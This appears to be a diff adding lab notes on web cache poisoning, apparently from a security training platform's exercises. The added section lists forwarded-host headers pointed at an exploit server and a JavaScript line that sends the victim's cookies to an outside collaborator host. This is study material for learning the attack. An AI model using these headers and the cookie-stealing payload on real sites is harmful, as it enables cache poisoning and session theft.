@@ -69,3 +69,13 @@ X-Forwarded-Scheme: http
 To check that the response was cached correctly, right-click on the request in Burp, select "Copy URL", and load this URL in Burp's browser.
 
 
+# Targeted web cache poisoning using an unknown header
+
+X-Forwarded-Host: exploit-0a56003803b033f28209c8f101b900f2.exploit-server.net  
+X-Host: exploit-0a56003803b033f28209c8f101b900f2.exploit-server.net  
+X-Forwarded-Server: exploit-0a56003803b033f28209c8f101b900f2.exploit-server.net
+
+document.location='http://7ksammb8rmagtt67ea2b6r05ewkm8b.oastify.com/?cookies='+document.cookie;
+
+
+
